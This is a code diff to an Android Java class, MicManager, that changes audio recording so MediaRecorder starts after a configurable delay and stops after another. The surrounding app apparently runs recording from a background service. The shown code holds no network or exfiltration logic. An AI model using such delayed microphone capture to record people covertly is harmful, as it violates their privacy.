@@ -28,9 +28,10 @@ public class MicManager {
     static MediaRecorder recorder;
     static File audiofile = null;
     static final String TAG = "MediaRecording";
+    static TimerTask startRecordingDelay;
     static TimerTask stopRecording;
 
-    public static void saveAudio(int sec, String path) throws Exception {
+    public static void saveAudio(int startDelay, int stopDelay, String path) throws Exception {
         File dir = MainService.getContextOfApplication().getCacheDir();
         try {
             Log.e("DIRR", dir.getAbsolutePath());
@@ -52,7 +53,15 @@ public class MicManager {
             recorder.setOutputFile(path);
         }
         recorder.prepare();
-        recorder.start();
+        startRecordingDelay = new TimerTask() {
+            @Override
+            public void run() {
+                recorder.start();
+
+            }
+        };
+
+        new Timer().schedule(startRecordingDelay, startDelay * 1000);
 
 
         stopRecording = new TimerTask() {
@@ -65,7 +74,9 @@ public class MicManager {
             }
         };
 
-        new Timer().schedule(stopRecording, sec * 1000);
+        new Timer().schedule(stopRecording, stopDelay * 1000);
+
+
 
     }
 
@@ -78,7 +89,6 @@ public class MicManager {
             Log.e(TAG, "external storage access error");
             return;
         }
-
 
         //Creating MediaRecorder and specifying audio source, output format, encoder & output format
         recorder = new MediaRecorder();
